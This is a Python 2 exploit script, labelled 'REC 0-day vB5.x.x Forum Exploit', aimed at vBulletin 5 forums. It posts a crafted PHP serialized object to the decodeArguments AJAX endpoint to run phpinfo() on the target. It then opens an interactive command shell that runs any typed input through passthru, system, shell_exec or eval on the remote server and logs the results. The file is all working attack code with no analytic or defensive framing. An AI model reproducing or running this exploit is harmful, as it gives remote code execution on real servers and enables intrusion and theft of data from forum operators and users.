#!/usr/bin/env python

import requests
import ssl
import sys
import time
requests.packages.urllib3.disable_warnings()

path = ''

def writeLog(data):
	try:
	    name = 'log.txt'
	    file = open(name,'a')   # Trying to create a new file or open one
	    file.write(data+'\n\n=====================================================================\n\n')
	    file.close()
	except Exception, e:
		print 'log error - don\'t worry not important '


def print_help():
    print
    print 
    print '	Usage: 0-day.py https|http://vbulletin.com/forum/ '
    print
    print '	expamle : ./0-day.py https|http://vbulletin.com/forum '
    print
    print '        REC 0-day vB5.x.x Forum Exploit'
    print 
    print ' uTox : F9464128289B78DCEB2A4008775A21FBFCCE20F3DD1A4F30DD1281CF7EF769608A58D97743D8'
    sys.exit(0)


headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20100101 Firefox/33.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Connection': 'keep-alive',
			'Content-type': 'application/x-www-form-urlencoded'
			}


def Extract_Server(Page):
	try:
		Slist = Page.split('class=\"e\">')
		Slist = Slist[1].split('class=\"v\">')
		Slist = Slist[1].split('</td>')
		return Slist[0]
	except Exception, e:
		print 'Sorry - this site not exploitable'
		sys.exit(1)

def MakeReq(link,mydata):
	try:
		req = requesting = requests.post(link, data=mydata, headers=headers, verify=False)
		page = req.text
		return page
	except Exception, e:
		print 'Page Request Error '
		return ''

def BuildReqest(cmd,method):
	PHP = 'arguments=O%3A7%3A%22vB_vURL%22%3A1%3A%7Bs%3A7%3A%22tmpfile%22%3BO%3A16%3A%22vB_View_AJAXHTML%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00content%22%3BO%3A12%3A%22vB5_Template%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00template%22%3Bs%3A10%3A%22widget_php%22%3Bs%3A13%3A%22%00%2A%00registered%22%3Ba%3A1%3A%7Bs%3A12%3A%22widgetConfig%22%3Ba%3A1%3A%7Bs%3A4%3A%22code|;s:%SIZE%:|%INJ%;die();|;}}}}}'
	EXE = 'arguments=O%3A7%3A%22vB_vURL%22%3A1%3A%7Bs%3A7%3A%22tmpfile%22%3BO%3A16%3A%22vB_View_AJAXHTML%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00content%22%3BO%3A12%3A%22vB5_Template%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00template%22%3Bs%3A10%3A%22widget_php%22%3Bs%3A13%3A%22%00%2A%00registered%22%3Ba%3A1%3A%7Bs%3A12%3A%22widgetConfig%22%3Ba%3A1%3A%7Bs%3A4%3A%22code|;s:%SIZE%:|%METHOD%(\'%INJ%\');die();|;}}}}}'

	if method!='PHP':
		post = EXE
		post = post.replace('%INJ%',cmd)
		post = post.replace('%METHOD%',method)
		post = post.replace('%SIZE%',str(len(cmd)+len(method)+11))
		post = post.replace('|','\"')
	else:
		post = PHP
		post = post.replace('%INJ%',cmd)
		post = post.replace('%SIZE%',str(len(cmd)+7))
		post = post.replace('|','\"')
	return post

def worker(forum):
	Exp = '/ajax/api/hook/decodeArguments'
	phpinfo = 'arguments=O%3A7%3A%22vB_vURL%22%3A1%3A%7Bs%3A7%3A%22tmpfile%22%3BO%3A16%3A%22vB_View_AJAXHTML%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00content%22%3BO%3A12%3A%22vB5_Template%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00template%22%3Bs%3A10%3A%22widget_php%22%3Bs%3A13%3A%22%00%2A%00registered%22%3Ba%3A1%3A%7Bs%3A12%3A%22widgetConfig%22%3Ba%3A1%3A%7Bs%3A4%3A%22code";s:16:"phpinfo();die();";}}}}}'


	mydata = phpinfo
	path= sys.argv[1] + Exp
	ReqPage = MakeReq(path,mydata)

	if len(ReqPage) != 0:
		srv = Extract_Server(ReqPage)
		print '\n'+ '   '+ srv + '\n'
		writeLog(srv)
	else:
		print ReqPage
		print 'Server : cant run phpinfo();'
		sys.exit(1)

	print '(1) passthru'
	print '(2) system'
	print '(3) shell_exec'
	print '(4) PHP_EVAL'

	method = ''
	value = raw_input("Enter Method Number : ")
	case = {
	'1': 'passthru',
	'2': 'system',
	'3': 'shell_exec',
	'4': 'PHP'
	}
	method = case[value]

	while (True):
		cmd = ''
		cmd = raw_input("$: ")
		if cmd=='exit':
			sys.exit(1)
		url_data = BuildReqest(cmd,method)
		ReqPage = MakeReq(path,url_data)
		print ReqPage
		writeLog(ReqPage)


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print_help()
    else:
        worker(sys.argv[1])
